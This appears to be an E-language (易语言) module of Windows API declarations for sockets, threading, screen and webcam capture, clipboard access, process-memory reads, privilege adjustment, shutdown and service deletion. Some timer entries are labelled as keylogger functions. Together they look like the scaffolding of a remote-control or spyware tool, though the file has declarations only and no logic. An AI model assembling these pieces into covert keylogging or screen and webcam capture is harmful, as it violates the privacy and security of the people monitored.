    .参数 映射方式, 整数型, , 用API常数表示的对文件映射的访问方式 2可读可写,4只读,
    .参数 高32位, 整数型, , 表示文件中的映射起点的高32位。通常均设为0表示从文件的起始处开始映射
    .参数 低32位, 整数型, , 表示文件中的映射起点的低32位。通常均设为0表示从文件的起始处开始映射
    .参数 字节数, 整数型, , 要映射的字节数，通常设为0表示映射整个文件映射对象。

.DLL命令 映射卸载, 整数型, "kernel32.dll", "UnmapViewOfFile", , 解除当前应用程序中的一个文件映射对象的映射地址空间。非零表示成功，零表示失败
    .参数 映射地址, 整数型, , 要解除映射的文件映射起始地址。

.DLL命令 写入映射_字节集, 整数型, "kernel32.dll", "RtlMoveMemory", , 将指定字节集的全部或部分写入映射空间的指定位置
    .参数 起始位置, 整数型, , 用映射装载命令得到的
    .参数 待写入数据, 字节集, 传址, 要写入的数据，可以更改为其他类型
    .参数 数据长度, 整数型, , 要写入的数据长度，不大于实际数据长度

.DLL命令 WSAStartup1, 整数型, "ws2_32.dll", "WSAStartup", , 
    .参数 wVersionRequiredas, 整数型, , 
    .参数 lpWSAData, WSADATA1, 传址, 

.DLL命令 WSACleanup1, 整数型, "ws2_32.dll", "WSACleanup", , 

.DLL命令 closesocket1, 整数型, "ws2_32.dll", "closesocket", , 
    .参数 s, 整数型, , 

.DLL命令 htons1, 短整数型, "ws2_32.dll", "htons", , 
    .参数 hostshortas, 短整数型, , 

.DLL命令 inet_addr1, 整数型, "ws2_32.dll", "inet_addr", , 
    .参数 cp, 文本型, , 

.DLL命令 WaitForSingleObject1, 整数型, "", "WaitForSingleObject", , 
    .参数 hHandle, 整数型, , 
    .参数 dwMilliseconds, 整数型, , 

.DLL命令 GetLastError1, 整数型, "", "GetLastError", , 

.DLL命令 WSARecv1, 整数型, "ws2_32.dll", "WSARecv", , 
    .参数 s, 整数型, , 
    .参数 lpBuffers, 整数型, , 
    .参数 dwBufferCount, 整数型, , 
    .参数 lpNumberOfBytesRecvd, 整数型, 传址, 
    .参数 lpFlags, 整数型, 传址, 
    .参数 lpOverlapped, 整数型, , 
    .参数 lpCompletionRoutine, 整数型, , 

.DLL命令 WSASend1, 整数型, "ws2_32.dll", "WSASend", , 
    .参数 s, 整数型, , 
    .参数 lpBuffers, 整数型, , 
    .参数 dwBufferCount, 整数型, , 
    .参数 lpNumberOfBytesSent, 整数型, 传址, 
    .参数 dwFlags, 整数型, , 
    .参数 lpOverlapped, 整数型, , 
    .参数 lpCompletionRoutine, 整数型, , 

.DLL命令 CreateIoCompletionPort1, 整数型, "", "CreateIoCompletionPort", , 
    .参数 Handle, 整数型, , 
    .参数 ExistingCompletionPort, 整数型, , 
    .参数 CompletionKey, 整数型, , 
    .参数 NumberOfConcurrentThreads, 整数型, , 

.DLL命令 GetQueuedCompletionStatus1, 逻辑型, "", "GetQueuedCompletionStatus", , 
    .参数 CompletionPort, 整数型, , 
    .参数 lpNumberOfBytesTransferred, 整数型, 传址, 
    .参数 lpCompletionKey, 整数型, 传址, 
    .参数 lpOverlapped, 整数型, 传址, 
    .参数 dwMilliseconds, 整数型, , 

.DLL命令 PostQueuedCompletionStatus1, 逻辑型, "", "PostQueuedCompletionStatus", , 
    .参数 CompletionPort, 整数型, , 
    .参数 dwNumberOfBytesTransferred, 整数型, , 
    .参数 dwCompletionKey, 整数型, , 
    .参数 lpOverlapped, 整数型, , 

.DLL命令 WSASocket1, 整数型, "Ws2_32.dll", "WSASocketA", , 
    .参数 af, 整数型, , 
    .参数 type, 整数型, , 
    .参数 protocol, 整数型, , 
    .参数 lpProtocolInfo, 整数型, , 
    .参数 g, 整数型, , 
    .参数 dwFlags, 整数型, , 

.DLL命令 GetSystemInfo1, 空白型, "", "GetSystemInfo", , 
    .参数 lpSystemInfo, SYSTEM_INFO, , 

.DLL命令 CloseHandle1, 逻辑型, "", "CloseHandle", , 
    .参数 hObject, 整数型, , 

.DLL命令 RtlMoveMemory_int_1, 空白型, "", "RtlMoveMemory", , 
    .参数 Destination, 整数型, , 
    .参数 Source, 整数型, 传址, 
    .参数 Length, 整数型, , 

.DLL命令 RtlMoveMemory_int_2, 空白型, "", "RtlMoveMemory", , 
    .参数 Destination, 整数型, 传址, 
    .参数 Source, 整数型, , 
    .参数 Length, 整数型, , 

.DLL命令 RtlMoveMemory_short_1, 空白型, "", "RtlMoveMemory", , 
    .参数 Destination, 整数型, , 
    .参数 Source, 短整数型, 传址, 
    .参数 Length, 整数型, , 

.DLL命令 RtlMoveMemory_short_2, 空白型, "", "RtlMoveMemory", , 
    .参数 Destination, 短整数型, 传址, 
    .参数 Source, 整数型, , 
    .参数 Length, 整数型, , 

.DLL命令 RtlMoveMemory_byte_1, 空白型, "", "RtlMoveMemory", , 
    .参数 Destination, 整数型, , 
    .参数 Source, 字节集, , 
    .参数 Length, 整数型, , 

.DLL命令 RtlMoveMemory_byte_2, 空白型, "", "RtlMoveMemory", , 
    .参数 Destination, 字节集, , 
    .参数 Source, 整数型, , 
    .参数 Length, 整数型, , 

.DLL命令 CreateThread1, 整数型, "", "CreateThread", , 
    .参数 lpThreadAttributes, 整数型, , 
    .参数 dwStackSize, 整数型, , 
    .参数 lpStartAddress, 子程序指针, , 
    .参数 lpParameter, 整数型, , 
    .参数 dwCreationFlags, 整数型, , 
    .参数 lpThreadId, 整数型, 传址, 

.DLL命令 TerminateThread1, 逻辑型, "", "TerminateThread", , 
    .参数 hThread, 整数型, , 
    .参数 dwExitCode, 整数型, , 

.DLL命令 GetExitCodeThread1, 逻辑型, "", "GetExitCodeThread", , 
    .参数 hThread, 整数型, , 
    .参数 lpExitCode, 整数型, 传址, 

.DLL命令 GetTickCount1, 整数型, "", "GetTickCount", , 

.DLL命令 connect1, 整数型, "ws2_32.dll", "connect", , 
    .参数 s, 整数型, , 
    .参数 name, sockaddr_in, , 
    .参数 namelen, 整数型, , 

.DLL命令 VirtualAlloc1, 整数型, "", "VirtualAlloc", , 
    .参数 lpAddress, 整数型, , 
    .参数 dwSize, 整数型, , 
    .参数 flAllocationType, 整数型, , 
    .参数 flProtect, 整数型, , 

.DLL命令 VirtualFree1, 逻辑型, "", "VirtualFree", , 
    .参数 lpAddress, 整数型, , 
    .参数 dwSize, 整数型, , 
    .参数 dwFreeType, 整数型, , 

.DLL命令 取系统目录_, 整数型, "kernel32", "GetSystemDirectoryA", , 
    .参数 缓冲区, 文本型, , 
    .参数 缓冲区长度, 整数型, , 

.DLL命令 API_取文件时间, 整数型, "kernel32", "GetFileTime", , 取得指定文件的时间信息　非零表示成功，零表示失败。会设置GetLastError
    .参数 文件句柄, 整数型, , 文件的句柄
    .参数 创建时间, FILETIME, , FILETIME，用于装载文件的创建时间
    .参数 前次访问时间, FILETIME, , FILETIME，用于装载文件上一次访问的时间（FAT文件系统不支持这一特性）
    .参数 前次修改时间, FILETIME, , FILETIME，用于装载文件上一次修改的时间;  

.DLL命令 API_时间结构转换, 整数型, "kernel32", "FileTimeToSystemTime", , 根据一个FILETIME结构的内容，装载一个SYSTEMTIME结构　非零表示成功，零表示失败。会设置GetLastError
    .参数 文件时间结构, FILETIME, , FILETIME，包含了文件时间的一个结构
    .参数 系统时间结构, 系统时间, , SYSTEMTIME，用于装载系统时间信息的一个结构;

.DLL命令 API_打开文件, 整数型, "kernel32", "OpenFile", , 这个函数能执行大量不同的文件操作。和这个函数相比，请优先考虑win32的CreateFile函数（它能打开命名管道和控制Unicode文件名，同时不受128个字符的路径名称的限制）　如执行成功，返回文件句柄。注意文件句柄可能是无效的；例如，假设指定了OF_EXIST标志，文件在函数返回前会关闭，但它打开时的句柄却永远不会返回。如果出错，函数会返回HFILE_ERROR；此时，由lpReOpenBuff指定的OFSTRUCT结构的nErrCode会设置成发生的错误。表OpenFile-2（OFSTRUCT出错代码）对这些错误进行了总结。会设置GetLastError
    .参数 文件名, 文本型, , 欲打开文件的名字
    .参数 文件操作结果, 文件结构信息_, , OFSTRUCT，该结构填充的数据包括与文件和操作结果有关的信息
    .参数 操作方式, 整数型, , 参考表OpenFile-1（OpenFile函数的标志常数表）总结的标志常数的组合，它决定了要采取的操作方式;

.DLL命令 API_LocalSize, 整数型, "kernel32", "LocalSize", , 返回本地内存块大小　
    .参数 hMem, 文件结构信息_, , 

.DLL命令 RtlAdjustPrivilege, 整数型, "ntdll.dll", "RtlAdjustPrivilege", , 
    .参数 Privilege, 整数型, , 
    .参数 NewValue, 整数型, , 
    .参数 NewThread, 整数型, , 
    .参数 OldValue, 整数型, 传址, 

.DLL命令 capGetDriverDescription, 逻辑型, "avicap32", "capGetDriverDescriptionA", , 视频
    .参数 dwDriverIndex, 整数型, , 
    .参数 lpszName, 文本型, , 
    .参数 cbName, 整数型, , 
    .参数 lpszVer, 文本型, , 
    .参数 cbVer, 整数型, , 

.DLL命令 capCreateCaptureWindowA, 整数型, "Avicap32", "capCreateCaptureWindowA", , 
    .参数 lpszWindowName, 文本型, , 
    .参数 dwStyl, 整数型, , 
    .参数 X, 整数型, , 
    .参数 Y, 整数型, , 
    .参数 nWidth, 整数型, , 
    .参数 nHeight, 整数型, , 
    .参数 hWndParent, 整数型, , 
    .参数 nID, 整数型, , 

.DLL命令 捕获视频, 整数型, "avicap32.dll", "capCreateCaptureWindowA", , capGetDriverDescription
    .参数 lpszWindowName, 文本型, , 
    .参数 dwStyle, 整数型, , 
    .参数 x, 整数型, , 
    .参数 y, 整数型, , 
    .参数 nWidth, 整数型, , 
    .参数 nHeight, 整数型, , 
    .参数 hWndParent, 整数型, , 
    .参数 nID, 整数型, , 

.DLL命令 取剪贴板数据, 整数型, "user32.dll", "GetClipboardData", , 
    .参数 参数, 整数型, , 

.DLL命令 关闭剪贴板, 整数型, "user32.dll", "CloseClipboard", , 

.DLL命令 打开剪贴板, 整数型, "user32.dll", "OpenClipboard", , 
    .参数 参数, 整数型, , 

.DLL命令 取对象属性_, 整数型, "gdi32", "GetObjectA", , 
    .参数 对象句柄, 整数型, , 
    .参数 数据尺寸, 整数型, , 
    .参数 属性, 位图结构_, , 

.DLL命令 GetDIBits, 整数型, "gdi32", "GetDIBits", , 将来自一幅位图的二进制位复制到一幅与设备无关的位图里　非零表示成功，零表示失败。在Windows 95中，返回值是返回的扫描线数量
    .参数 aHDC, 整数型, , 定义了与设备有关位图hBitmap的配置信息的一个设备场景的句柄
    .参数 hBitmap, 整数型, , 源位图的句柄。绝对不能将这幅位图选入设备场景
    .参数 nStartScan, 整数型, , 欲复制到DIB中的第一条扫描线的编号
    .参数 nNumScans, 整数型, , 欲复制的扫描线数量
    .参数 lpBits, 字节集, 传址, 指向一个缓冲区的指针。这个缓冲区将用于装载采用DIB格式的信息，但不取回数据（用ByVal传递零值）
    .参数 lpBI, BITMAPINFOHEADER, , BITMAPINFO，对lpBits DIB的格式及颜色进行说明的一个结构。在BITMAPINFOHEADER结构中，从biSize到biCompression之间的所有字段都必须初始化
    .参数 wUsage, 整数型, , 下述常数之一：;DIB_PAL_COLORS：在颜色表中装载一个16位所以数组，它们与当前选定的调色板有关;DIB_RGB_COLORS：在颜色表中装载RGB颜色;  

.DLL命令 _取字节集指针, 整数型, "", "lstrcpyn", 公开, 
    .参数 目的指针, 字节集, 传址, 
    .参数 源指针, 字节集, 传址, 
    .参数 复制长度, 整数型, , 0

.DLL命令 SendMessageA, 整数型, "user32", "SendMessageA", , 
    .参数 hwnd, 整数型, , 
    .参数 wMsg, 整数型, , 
    .参数 wParam, 整数型, , 
    .参数 lParam, 整数型, , 

.DLL命令 GetObject, 整数型, "", "GetObjectA", , 
    .参数 hgdiobj, 整数型, , 
    .参数 cbBuffer, 整数型, , 
    .参数 lpvObject, BITMAP, , 

.DLL命令 GetDIBits_BimapInfo, 整数型, "", "GetDIBits", , 
    .参数 HDC, 整数型, , 
    .参数 hBitmap, 整数型, , 
    .参数 nStartScan, 整数型, , 
    .参数 nNumScans, 整数型, , 
    .参数 lpBits, 整数型, , 
    .参数 lpBI, BITMAPINFO1, , 
    .参数 wUsage, 整数型, , 

.DLL命令 GetDIBits1, 整数型, "", "GetDIBits", , 
    .参数 HDC, 整数型, , 
    .参数 hBitmap, 整数型, , 
    .参数 nStartScan, 整数型, , 
    .参数 nNumScans, 整数型, , 
    .参数 lpBits, 字节集, , 
    .参数 lpBI, BITMAPINFO1, , 
    .参数 wUsage, 整数型, , 

.DLL命令 CopyMemory_BITMAPINFO1, 整数型, "", "RtlMoveMemory", , 
    .参数 Destination, 字节集, , 
    .参数 Source, BITMAPINFO1, , 
    .参数 Length, 整数型, , 

.DLL命令 CopyMemory_BITMAPFILEHEADER1, 整数型, "", "RtlMoveMemory", , 
    .参数 Destination, 字节集, , 
    .参数 Source, BITMAPFILEHEADER, , 
    .参数 Length, 整数型, , 

.DLL命令 取文本地址_, 整数型, "shlwapi.dll", "StrDupA", , 
    .参数 文本, 文本型, , lpSrch

.DLL命令 GetWindowRect, 整数型, "user32", "GetWindowRect", , 取得的矩形区域相对于屏幕左上角开始
    .参数 窗口句柄, 整数型, , 
    .参数 矩形区域, RECT, , 

.DLL命令 FillMemory, 空白型, "", "RtlFillMemory", , 填充内存字节
    .参数 Destination, 整数型, , 指针地址
    .参数 Length, 整数型, , 长度
    .参数 Fill, 字节型, , 字节数据

.DLL命令 LocalSize_WNDCLASSEX, 整数型, "kernel32.dll", "LocalSize", , 取结构尺寸
    .参数 参数一, WNDCLASSEX, 传址, 

.DLL命令 NtShutdownSystem, 整数型, "ntdll.dll", "NtShutdownSystem", , 
    .参数 ShutdownAction, 整数型, , 

.DLL命令 LoadIcon, 整数型, "user32", "LoadIconA", , 从指定的模块或应用程序实例中载入一个图标。其中，LoadIconBynum是LoadIcon函数的类型安全声明　执行成功则返回已载入的图标的句柄；零表示失败。会设置GetLastError
    .参数 实例句柄, 整数型, , 
    .参数 图标标识, 整数型, , 

.DLL命令 LoadCursor, 整数型, "user32", "LoadCursorA", , 从指定的模块或应用程序实例中载入一个鼠标指针。LoadCursorBynum是LoadCursor函数的类型安全声明　执行成功则返回已载入的指针的句柄；零表示失败。在Windows ;    95 和Win16环境中，这个函数只能载入标准尺寸的图标
    .参数 实例句柄, 整数型, , 一个DLL的模块句柄；或者一个实例句柄，指定包含了鼠标指针的可执行程序
    .参数 鼠标指针标识, 整数型, , 作为一个字串，指定欲载入的指针资源。作为一个长整数值，指定欲载入的资源ID；或者设置一个常数，代表某幅固有系统指针。如装载的是一个固有系统指针，注意hInstance参数应设为零。在api32.txt文件中以前缀IDC_ 作为标志;  

.DLL命令 RegisterClassEx, 整数型, "user32", "RegisterClassExA", , 　
    .参数 pcWndClassEx, WNDCLASSEX, , 

.DLL命令 取父窗口_, 整数型, "user32", "GetParent", , 判断指定窗口的父窗口  父窗口的句柄。如窗口没有父，或遇到错误，则返回零。会设置GetLastError
    .参数 窗口句柄, 整数型, , 欲测试的窗口的句柄;

.DLL命令 GetMessage, 整数型, "user32", "GetMessageA", , 从线索消息队列中返回一条消息　
    .参数 lpMsg, MSG, , 
    .参数 hwnd, 整数型, , 
    .参数 wMsgFilterMin, 整数型, , 
    .参数 wMsgFilterMax, 整数型, , 

.DLL命令 TranslateMessage, 整数型, "user32", "TranslateMessage", , 转换虚拟关键字消息　
    .参数 lpMsg, MSG, , 

.DLL命令 DispatchMessage, 整数型, "user32", "DispatchMessageA", , 向窗口发送消息　
    .参数 lpMsg, MSG, , 

.DLL命令 执行子程序_, 整数型, "user32.dll", "CallWindowProcA", , 执行子程序
    .参数 事件程序, 子程序指针, , 
    .参数 窗口句柄, 整数型, , 
    .参数 消息值, 整数型, , 
    .参数 附加参数1, 整数型, , 
    .参数 附加参数2, 整数型, , 

.DLL命令 DefWindowProc, 整数型, "user32", "DefWindowProcA", , 调用缺省窗口过程　
    .参数 hwnd, 整数型, , 
    .参数 wMsg, 整数型, , 
    .参数 wParam, 整数型, , 
    .参数 lParam, 整数型, , 

.DLL命令 取子程序指针地址_, 整数型, "kernel32.dll", "lstrcpyn", , 
    .参数 数据1, 子程序指针, 传址, lpString1
    .参数 数据2, 子程序指针, 传址, lpString2
    .参数 数据长度, 整数型, , iMaxLength

.DLL命令 GetWindowTextLength, 整数型, "", "GetWindowTextLengthA", , 公开, 取窗口标题长度_
    .参数 窗口句柄, 整数型, , 欲获取文字长度的那个窗口的句柄

.DLL命令 UpdateWindow, 整数型, "user32", "UpdateWindow", , 强制立即更新窗口，窗口中以前屏蔽的所有区域都会重画（在vb里使用：如vb窗体或控件的任何部分需要更新，可考虑直接使用refresh方法　非零表示成功，零表示失败
    .参数 hwnd, 整数型, , 欲更新窗口的句柄;

.DLL命令 GetWindowText, 整数型, "user32", "GetWindowTextA", , 取得一个窗体的标题（caption）文字，或者一个控件的内容（在vb里使用：使用vb窗体或控件的caption或text属性）  复制到lpString的字串长度；不包括空中止字符。会设置GetLastError
    .参数 窗口句柄, 整数型, , 欲获取文字的那个窗口的句柄
    .参数 缓冲区, 整数型, , 预定义的一个缓冲区，至少有cch+1个字符大小；随同窗口文字载入
    .参数 缓冲尺寸, 整数型, , lp缓冲区的长度;

.DLL命令 CreateWindowEx, 整数型, "user32.dll", "CreateWindowExA", , 
    .参数 dwExStyle, 整数型, , 
    .参数 lpClassName, 文本型, , 窗口实例的类的名字
    .参数 lpWindowName, 文本型, , 窗口标题名
    .参数 dwStyle, 整数型, , 新创建的窗口的样式
    .参数 X, 整数型, , 窗口左上角的横坐标
    .参数 Y, 整数型, , 窗口左上角的纵坐标
    .参数 nWidth, 整数型, , 窗口的宽度
    .参数 nHeight, 整数型, , 窗口的高度
    .参数 hWndParent, 整数型, , 该窗口的父窗口的句柄
    .参数 hMenu, 整数型, , 窗口主菜单句柄
    .参数 hInstance, 整数型, , 创建窗口的应用程序当前句柄
    .参数 lpParam, 整数型, , 指向一个传递给窗口的参数值的指针

.DLL命令 PostQuitMessage, 空白型, "user32", "PostQuitMessage", , 通知WINDOWS线索将中断　
    .参数 nExitCode, 整数型, , 

.DLL命令 创建纯色刷子_, 整数型, "gdi32.dll", "CreateSolidBrush", , 
    .参数 颜色值, 整数型, , crColor，颜色值

.DLL命令 选入设备场景_, 整数型, "gdi32.dll", "SelectObject", , SelectObject
    .参数 场景句柄, 整数型, , hdc
    .参数 对象句柄, 整数型, , hobject

.DLL命令 设置背景颜色_, 整数型, "gdi32.dll", "SetBkColor", , SetBkColor，背景颜色用于填充阴影刷子、虚线画笔以及字符（如背景模式为OPAQUE）中的空隙。也在位图颜色转换期间使用。参考SetBkMode,Long，前一个背景色，CLR_INVALID表示出错
    .参数 设备场景句柄, 整数型, , hdc，设备场景的句柄
    .参数 RGB颜色值, 整数型, , crColor，新背景颜色的RGB颜色值

.DLL命令 设置前景色_, 整数型, "gdi32", "SetTextColor", , 
    .参数 设备场景, 整数型, , 
    .参数 颜色, 整数型, , 

.DLL命令 ReadProcessMemory_NMHDR, 整数型, "", "ReadProcessMemory", , API_读内存
    .参数 hProcess, 整数型, , 
    .参数 lpBaseAddress, 整数型, , 
    .参数 lpBuffer, NMHDR, 传址, 
    .参数 nSize, 整数型, , 
    .参数 lpNumberOfBytesRead, 整数型, , 

.DLL命令 ReadProcessMemory_NMLISTVIEW, 整数型, "", "ReadProcessMemory", , 读NMLISTVIEW结构
    .参数 hProcess, 整数型, , 进程句柄
    .参数 lpBaseAddress, 整数型, , 源地
    .参数 lpBuffer, NMLISTVIEW, 传址, 目的地
    .参数 nSize, 整数型, , 大小
    .参数 lpNumberOfBytesRead, 整数型, , 0

.DLL命令 LocalSize_NMLISTVIEW, 整数型, "kernel32.dll", "LocalSize", , 取结构尺寸
    .参数 参数一, NMLISTVIEW, 传址, 

.DLL命令 ReadProcessMemory_NMLVDISPINFO, 整数型, "", "ReadProcessMemory", , 读NMLISTVIEW结构
    .参数 hProcess, 整数型, , 进程句柄
    .参数 lpBaseAddress, 整数型, , 源地
    .参数 lpBuffer, NMLVDISPINFO, 传址, 目的地
    .参数 nSize, 整数型, , 大小
    .参数 lpNumberOfBytesRead, 整数型, , 0

.DLL命令 LocalSize_NMLVDISPINFO, 整数型, "kernel32.dll", "LocalSize", , 取结构尺寸
    .参数 参数一, NMLVDISPINFO, 传址, 

.DLL命令 ReadProcessMemory_TOOL, 整数型, "", "ReadProcessMemory", , API_读内存
    .参数 hProcess, 整数型, , 
    .参数 lpBaseAddress, 整数型, , 
    .参数 lpBuffer, TOOLTIPTEXT, 传址, 
    .参数 nSize, 整数型, , 
    .参数 lpNumberOfBytesRead, 整数型, , 

.DLL命令 API_读内存3, 整数型, "", "ReadProcessMemory", , 
    .参数 hProcess, 整数型, , 
    .参数 lpBaseAddress, TOOLTIPTEXT, , 
    .参数 lpBuffer, 整数型, , 
    .参数 nSize, 整数型, , 
    .参数 lpNumberOfBytesRead, 整数型, , 

.DLL命令 呼叫窗口函数地址_, 整数型, "user32.dll", "CallWindowProcA", , 执行窗口过程
    .参数 前一窗口函数地址, 整数型, , 
    .参数 窗口句柄, 整数型, , 
    .参数 消息值, 整数型, , 
    .参数 附加参数1, 整数型, , 
    .参数 附加参数2, 整数型, , 

.DLL命令 GetDriverDescription, 逻辑型, "avicap32.dll", "capGetDriverDescriptionA", , 
    .参数 s, 空白型, , 
    .参数 e, 文本型, , 
    .参数 r, 空白型, , 
    .参数 d, 文本型, , 
    .参数 f, 空白型, , 

.DLL命令 设置窗口标题_, 整数型, "user32", "SetWindowTextA", , ,
    .参数 窗口句柄, 整数型, , 
    .参数 窗口标题, 文本型, , 

.DLL命令 SendMessageA_luoji, 逻辑型, "user32", "SendMessageA", , 调用一个窗口的窗口函数，将一条消息发给那个窗口。除非消息处理完毕，否则该函数不会返回。SendMessageBynum， ;    SendMessageByString是该函数的“类型安全”声明形式  由具体的消息决定
    .参数 窗口句柄, 整数型, , 要接收消息的那个窗口的句柄
    .参数 信息值, 整数型, , 消息的标识符
    .参数 参数一, 整数型, , 具体取决于消息
    .参数 参数二, 整数型, , 具体取决于消息;

.DLL命令 LocalSize, 整数型, "kernel32", "LocalSize", , 返回本地内存块大小
    .参数 hMem, WNDCLASSEX, , 

.DLL命令 发送消息文本, 整数型, "user32.dll", "SendMessageA", , 
    .参数 目标窗口, 整数型, , 
    .参数 消息标志, 整数型, , 
    .参数 参数1, 整数型, , 
    .参数 参数2, 文本型, , 

.DLL命令 改变窗口_, 整数型, "user32", "MoveWindow", , 改变指定窗口的位置和大小。顶级窗口可能受最大或最小尺寸的限制，那些尺寸优先于这里设置的参数  非零表示成功，零表示失败
    .参数 窗口句柄, 整数型, , 欲移动窗口的句柄
    .参数 左侧位置, 整数型, , 窗口新的左侧位置
    .参数 顶部位置, 整数型, , 窗口新的顶部位置
    .参数 新宽度, 整数型, , 窗口的新宽度
    .参数 高宽度, 整数型, , 窗口的高宽度
    .参数 是否重画, 整数型, , 如窗口此时应重画，则设为TRUE（非零）。FALSE（零）则表明应用程序会自己决定是否重画窗口;

.DLL命令 GetAsyncKeyState, 整数型, "user32", "GetAsyncKeyState", , ,
    .参数 键代码, 整数型, , vKey Long，欲测试的虚拟键的键码

.DLL命令 API_最近的输入虚拟键状态, 整数型, "user32", "GetKeyState", , 
    .参数 键代码, 整数型, , 

.DLL命令 键盘记录_SetEvent, 整数型, "winmm.dll", "timeSetEvent", , 
    .参数 uDelay, 整数型, , 
    .参数 uResolution, 整数型, , 
    .参数 lpFunction, 子程序指针, , 
    .参数 dwUser, 整数型, , 
    .参数 uFlags, 整数型, , 

.DLL命令 键盘记录_KillEvent, 整数型, "winmm.dll", "timeKillEvent", , 
    .参数 uID, 整数型, , 

.DLL命令 取设备场景_, 整数型, "", "GetDC", , 获取指定窗口的设备场景　指定窗口的设备场景句柄，出错则为0
    .参数 hwnd, 整数型, , 将获取其设备场景的窗口的句柄。若为0，则要获取整个屏幕的DC; 

.DLL命令 复制场景位图_, 整数型, "", "BitBlt", , gdi32.dll将一幅位图从一个设备场景复制到另一个。源和目标DC相互间必须兼容  非零表示成功，零表示失败。会设置GetLastError
    .参数 目标设备场景, 整数型, , 目标设备场景
    .参数 目标横坐标, 整数型, , 对目标DC中目标矩形左上角位置进行描述的那个点。用目标DC的逻辑坐标表示
    .参数 目标纵坐标, 整数型, , 同上
    .参数 传输图像宽度, 整数型, , 欲传输图象的宽度和高度
    .参数 传输图像高度, 整数型, , 同上
    .参数 源设备场景, 整数型, , 源设备场景。如光栅运算未指定源，则应设为0
    .参数 源横坐标, 整数型, , 对源DC中源矩形左上角位置进行描述的那个点。用源DC的逻辑坐标表示
    .参数 源纵坐标, 整数型, , 同上
    .参数 光栅运算方式, 整数型, , 传输过程要执行的光栅运算;

.DLL命令 获取系统信息2, 整数型, "", "GetDeviceCaps", , 
    .参数 hdc, 整数型, , 
    .参数 nIndex, 整数型, , 

.DLL命令 创建内存场景_, 整数型, "", "CreateCompatibleDC", , 
    .参数 hdc, 整数型, , 

.DLL命令 选入设备场景, 整数型, "", "SelectObject", , 
    .参数 hdc, 整数型, , 
    .参数 obj, 整数型, , 

.DLL命令 删除句柄, 逻辑型, "", "DeleteObject", , 
    .参数 GDI对象句柄, 整数型, , 

.DLL命令 删除场景, 整数型, "", "DeleteDC", , 
    .参数 hdc, 整数型, , 

.DLL命令 获取系统信息, 整数型, "", "GetSystemMetrics", , 
    .参数 nIndex, 整数型, , 

.DLL命令 _控制鼠标, 空白型, "user32", "mouse_event", , 
    .参数 dwFlags, 整数型, , 
    .参数 dx, 整数型, , 
    .参数 dy, 整数型, , 
    .参数 cButtons, 整数型, , 
    .参数 dwExtraInfo, 整数型, , 

.DLL命令 _移动鼠标, 空白型, "user32", "SetCursorPos", 公开, 
    .参数 x, 整数型, , 
    .参数 y, 整数型, , 

.DLL命令 创建GDI对象_, 整数型, "", "CreateDIBSection", , gdi32.dll
    .参数 设备场景句柄, 整数型, , 
    .参数 位图数据, 字节集, 传址, 
    .参数 常数, 整数型, , 
    .参数 内存地址, 整数型, 传址, 
    .参数 文件映射句柄, 整数型, , 
    .参数 偏移量, 整数型, , 

.DLL命令 复制内存_复制字节集到字节集, 整数型, "", "RtlMoveMemory", , kernel32.dll
    .参数 pDestination, 字节型, 传址, 
    .参数 pSource, 字节型, 传址, 
    .参数 Length, 整数型, , 

.DLL命令 复制内存_复制地址到字节集, 整数型, "", "RtlMoveMemory", , kernel32.dll
    .参数 pDestination, 字节型, 传址, 
    .参数 pSource, 整数型, , 
    .参数 Length, 整数型, , 

.DLL命令 释放场景, 整数型, "", "ReleaseDC", , 
    .参数 hwnd, 整数型, , 
    .参数 hdc, 整数型, , 

.DLL命令 复制内存_复制位图头到字节集, 空白型, "", "RtlMoveMemory", , 
    .参数 Dest, 字节型, 传址, 
    .参数 Src, BITMAPINFOHEADER, , 
    .参数 len, 空白型, , 

.DLL命令 处理绘图操作_, 整数型, "", "GdiFlush", , gdi32.dll 执行任何未决的绘图操作,如所有未决的绘图操作都成功完成，就返回TRUE（非零）。如任何一个操作失败，就返回零值

.DLL命令 复制内存_复制位图文件头到字节集, 空白型, "", "RtlMoveMemory", , 
    .参数 Dest, 字节型, 传址, 
    .参数 Src, 文件头信息_, , 
    .参数 len, 整数型, , 

.DLL命令 创建线程, 整数型, "kernel32", "CreateThread", , 启动线程
    .参数 lpThreadAttributes, 整数型, , 
    .参数 dwStackSize, 整数型, , 
    .参数 lpStartAddress, 子程序指针, , 
    .参数 lpParameter, 整数型, , 
    .参数 dwCreationFlags, 整数型, , 
    .参数 lpThreadId, 整数型, 传址, 

.DLL命令 复制内存_复制地址到地址, 整数型, "", "RtlMoveMemory", , kernel32.dll
    .参数 pDestination, 整数型, , 
    .参数 pSource, 整数型, , 
    .参数 Length, 整数型, , 

.DLL命令 关闭内核对象, 整数型, "kernel32", "CloseHandle", , 
    .参数 hObject, 整数型, , 

.DLL命令 _设置窗口信息, 整数型, "", "SetWindowLongA", , 在窗口结构中为指定的窗口设置信息  指定数据的前一个值
    .参数 hwnd, 整数型, , 句柄
    .参数 nIndex, 整数型, , -16=样式，-20=扩展样式
    .参数 dwNewLong, 整数型, , 新样式

.DLL命令 _透明窗口, 逻辑型, "", "SetLayeredWindowAttributes", , 成功返回真，否则返回假
    .参数 hwnd, 整数型, , 透明窗体的句柄
    .参数 crKey, 整数型, , 颜色值
    .参数 bAlpha, 字节型, , 透明度，取值范围是[0,255]
    .参数 dwFlags, 整数型, , 透明方式：LWA_ALPHA(2)时，crKey参数无效，bAlpha参数有效 || LWA_COLORKEY(1)时，bAlpha参数有效而窗体中的所有颜色为crKey的地方将变为透明

.DLL命令 GlobalMemoryStatusEx, 整数型, "kernel32", "GlobalMemoryStatusEx", , ,
    .参数 缓冲区结构, LPMEMORYSTATUSEX, , lpBuffer

.DLL命令 API_DeleteService, 整数型, "advapi32.dll", "DeleteService", , 
    .参数 服务句柄, 整数型, , hService

.DLL命令 WindowFromDC, 整数型, "user32", "WindowFromDC", 公开, 取回与某一设备场景相关的窗口的句柄  执行成功为设备场景对应的窗口的句柄，失败为0
    .参数 hdc, 整数型, , 设备场景句柄;

.DLL命令 销毁线程, 空白型, "", "TerminateThread", , 
    .参数 hThread, 整数型, , 
    .参数 dwExitCode, 整数型, , 

.DLL命令 CloseHandle, 整数型, "", "CloseHandle", 公开, 
    .参数 hObject, 整数型, , 

.DLL命令 GetCurrentProcessId, 整数型, "", "GetCurrentProcessId", 公开, 

.DLL命令 GetProcAddress, 整数型, "", "GetProcAddress", 公开, 
    .参数 hinst, 整数型, , 
    .参数 函数过程名, 文本型, , 

.DLL命令 GetModuleHandle, 整数型, "", "GetModuleHandleA", 公开, 
    .参数 lpModuleName, 文本型, , 

.DLL命令 OpenProcess, 整数型, "", "OpenProcess", 公开, 
    .参数 a, 整数型, , 
    .参数 b, 整数型, , 
    .参数 c, 整数型, , 

